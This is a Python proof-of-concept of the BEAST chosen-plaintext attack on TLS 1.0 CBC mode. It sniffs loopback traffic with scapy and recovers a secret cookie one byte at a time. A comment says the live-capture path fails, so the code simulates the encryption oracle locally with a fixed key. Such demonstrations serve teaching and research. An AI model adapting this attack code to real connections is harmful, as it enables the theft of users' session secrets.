from Crypto.Cipher import AES
from Crypto import Random
import os
import subprocess
import time
import threading
import scapy.all as scapy

SECRET = b"_SECRET<3COOKIE_"
BLOCK_SIZE = 16

packet_queue = []

openssl_process = subprocess.Popen(
    'openssl s_client -connect localhost:8443 -tls1 -cipher AES128-SHA',
    shell=True,
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    text=False
)

interface = 'lo'
filter_expression = 'tcp port 8443 and (ether[0x68] = 0x03) and (ether[0x69] = 0x01)'

def packet_handler(packet):
    if packet.haslayer(scapy.IP) and packet.haslayer(scapy.TCP):
        eth_layer = packet.getlayer(scapy.Ether)
        ip_layer = packet.getlayer(scapy.IP)
        tcp_layer = packet.getlayer(scapy.TCP)

        pack_data = bytes(eth_layer)

        if pack_data and pack_data[0x68] == 0x03 and pack_data[0x69] == 0x01:
            packet_queue.append(pack_data[0x6c:])

def capture_packets(interface, filter_expression):
    scapy.sniff(iface=interface, filter=filter_expression, prn=packet_handler)

def pad(s):
    padding_required = BLOCK_SIZE - len(s) % BLOCK_SIZE
    padding_char = bytes([padding_required])
    return s + padding_char * padding_required

def unpad(data):
    padding_length = ord(data[-1])
    return data[:(-padding_length)]

def xor(xs, ys, zs):
    result = b''
    for i in range(len(xs)):
        result += bytes([xs[i] ^ ys[i] ^ zs[i]])
    return result

def send_request(msg, last_iv):
    openssl_process.stdin.write(msg+SECRET)
  
    # This is not working due to openssl client sending extra unique stuff alongside my string and some TCP buffering shenanigans
    # PoC will for now do with local encryption
  
    # while(len(packet_queue) == 0):
    #    time.sleep(1)
    # enc = packet_queue.pop(0)
    # last_iv = enc[-BLOCK_SIZE:]

    enc = AES.new(
        b'!!VULN_FIXD_IV!!', 
        AES.MODE_CBC, 
        last_iv
        ).encrypt(pad(msg + SECRET))
    last_iv = enc[-BLOCK_SIZE:]

    print(enc)
    return enc, last_iv

def beast():
    last_iv = os.urandom(AES.block_size)
    secret = b""
    # assuming that len(SECRET_COOKIE) == BLOCK_LENGTH
    for padding in reversed(range(BLOCK_SIZE)): 
        ok = False
        for i in range(256):
            guess = bytes(secret) + bytes([i])
            _, last_iv_1 = send_request(b'a' * 16, last_iv)
            second_r, last_iv_2 = send_request(b'a' * padding, last_iv_1)
            third_r, last_iv = send_request(
                xor(last_iv_2, last_iv_1, b'a' * padding + guess), 
                last_iv_2)

            if second_r[:BLOCK_SIZE] == third_r[:BLOCK_SIZE]:
                secret = bytes(secret) + bytes([i])
                ok = True
                break
        if not ok:
            return ":("
    return secret

capture_thread = threading.Thread(target=capture_packets, args=(interface, filter_expression))
capture_thread.start()
secret = beast()
print(secret)
